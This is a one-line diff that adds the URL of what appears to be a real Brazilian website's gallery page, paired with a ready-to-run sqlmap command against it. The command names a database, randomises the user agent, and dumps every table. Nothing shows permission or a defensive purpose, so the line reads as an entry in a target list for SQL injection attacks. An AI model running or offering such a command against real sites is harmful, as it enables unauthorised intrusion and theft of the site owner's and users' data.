@@ -1,0 +1,1 @@
+http://www.ceciliavasconcelos.com.br/galeria.php?c=1 (GET)  # sqlmap.py -u http://www.ceciliavasconcelos.com.br/galeria.php?c=1 -D ceciliavasconc --threads 5 -v3 --random-agent --tables --dump-all
